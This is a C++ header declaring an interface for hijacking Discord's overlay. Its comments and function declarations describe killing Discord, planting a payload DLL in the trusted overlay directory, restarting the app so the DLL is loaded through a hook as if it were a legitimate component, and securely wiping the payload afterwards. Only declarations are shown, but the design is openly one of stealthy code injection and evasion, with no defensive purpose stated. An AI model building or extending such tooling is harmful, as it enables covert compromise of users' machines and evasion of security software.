#pragma once
#include <Windows.h>
#include <string>

// ============================================================
// Discord Overlay Injection Masking
// 
// Full Discord overlay hijack cycle:
//   1. Kill Discord (release locks on overlay directory)
//   2. Stage payload DLL in overlay directory
//   3. Restart Discord (overlay reinitializes, sees our DLL)
//   4. Inject via hook — LoadLibrary comes from Discord's
//      trusted overlay path, looks like a legitimate component
// ============================================================

// Check if Discord is installed and the overlay directory exists
bool IsDiscordInstalled();

// Find the path to Discord's overlay module directory
// Returns empty string if Discord is not found
std::wstring FindDiscordOverlayDir();

// Find the path to Discord's Update.exe (used to restart)
std::wstring FindDiscordExePath();

// Kill all Discord processes and wait for them to fully exit
// Returns true if Discord was running and was killed
bool KillDiscord();

// Restart Discord after staging the payload
// Waits for Discord to fully initialize before returning
bool RestartDiscord();

// Check if Discord is currently running
bool IsDiscordRunning();

// Full overlay masking cycle:
//   1. Kill Discord
//   2. Stage payload in overlay dir
//   3. Restart Discord
//   4. Return the staged path for hook loading
// srcDllPath: path to the payload DLL on disk
// Returns the full path to the staged DLL, or empty on failure
std::wstring StagePayloadAsOverlay(const std::wstring& srcDllPath);

// Remove the staged overlay payload and securely wipe it
// stagedPath: the path returned by StagePayloadAsOverlay
bool CleanupOverlayPayload(const std::wstring& stagedPath);

// Get the currently staged overlay path (if any)
std::wstring GetStagedOverlayPath();

// Set the staged overlay path (for tracking)
void SetStagedOverlayPath(const std::wstring& path);
